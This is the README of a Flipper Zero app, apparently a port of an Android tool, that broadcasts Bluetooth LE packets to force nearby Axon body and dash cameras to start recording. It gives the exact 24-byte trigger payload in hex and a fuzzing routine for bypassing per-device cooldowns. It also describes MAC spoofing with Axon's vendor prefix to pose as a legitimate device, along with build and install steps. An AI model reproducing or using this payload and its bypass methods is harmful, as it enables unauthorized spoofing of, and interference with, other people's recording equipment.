# Axonapotamus

A Flipper Zero app to wirelessly trigger any Axon Body or Dash Cams in range to start recording.

Ported from [AxonCadabra](https://github.com/WithLoveFromMinneapolis/AxonCadabra) (Android).

## Features

- **Single-screen UI**: OK to Start/Stop, Left/Right to toggle Fuzz mode
- **Primary broadcast**: Sends known-working payload every 500ms to trigger camera recording
- **Fuzz mode**: Iterate through payload values to bypass per-device trigger cooldown
- **Randomized MAC**: Each session uses a new random MAC address with Axon OUI (00:25:DF) prefix

## MAC Randomization

Each time you start transmission, a new random MAC address is generated:
- First 3 bytes: Axon OUI (`00:25:DF`) - appears as legitimate Axon device
- Last 3 bytes: Random via hardware RNG

This prevents tracking and may help bypass per-device filtering.

## Notes

- Don't bet your life on this working - cameras can be configured to ignore non-allowlisted Axon serial numbers
- Cameras can only be forced to START recording; the operator can always stop it
- Fuzz mode attempts to bypass the per-device trigger cooldown by varying payload bytes

## Payload Structure

**Base Payload (24 bytes):**
```
Pos:  00 01 02 03 04 05 06 07 08 09 10 11 12 13 14 15 16 17 18 19 20 21 22 23
Hex:  01 58 38 37 30 30 32 46 50 34 01 02 00 00 00 00 CE 1B 33 00 00 02 00 00
                                       ^^^^^ ^^                   ^^^^^ ^^
                                       |     |                    |     |
                                       +-----+--------------------+-----+-- Fuzzed bytes
```

**Fuzz Algorithm:**
```c
payload[10] = (fuzz_value >> 8) & 0xFF;   // High byte of fuzz_value
payload[11] = fuzz_value & 0xFF;          // Low byte of fuzz_value
payload[20] = (fuzz_value >> 4) & 0xFF;   // Middle nibbles
payload[21] = (fuzz_value << 4) & 0xFF;   // Low nibble shifted
```

**Payload Comparison Table:**

| fuzz_value | Bytes 10-11 | Bytes 20-21 | Notes |
|------------|-------------|-------------|-------|
| Original   | `01 02`     | `00 02`     | Send Start Loop (never sent by fuzz) |
| 0x0000     | `00 00`     | `00 00`     | Fuzz start |
| 0x0001     | `00 01`     | `00 10`     | |
| 0x0002     | `00 02`     | `00 20`     | 10-11 matches, 20-21 differs |
| 0x0010     | `00 10`     | `01 00`     | |
| 0x0100     | `01 00`     | `10 00`     | |
| 0x0102     | `01 02`     | `10 20`     | 10-11 matches original, 20-21 differs |
| 0x1000     | `10 00`     | `00 00`     | |
| 0xFFFF     | `FF FF`     | `FF F0`     | Max value |

**Note:** No fuzz_value produces both `01 02` AND `00 02` simultaneously. The original payload is never replicated by fuzz mode.

## Requirements

- Flipper Zero with BLE capability
- Flipper Zero firmware (official or custom)

## Build

```bash
# Copy to Flipper firmware
cp -r flipper_app /path/to/flipperzero-firmware/applications_user/axonapotamus

# Build
cd /path/to/flipperzero-firmware
./fbt fap_axonapotamus
```

## Install

Copy `build/f7-firmware-D/.extapps/axonapotamus.fap` to your Flipper's SD card under `apps/Bluetooth/`.

Or use qFlipper to install the .fap file.

## License

Use this code in whatever way keeps people safe and don't ever charge for it or any derivatives.
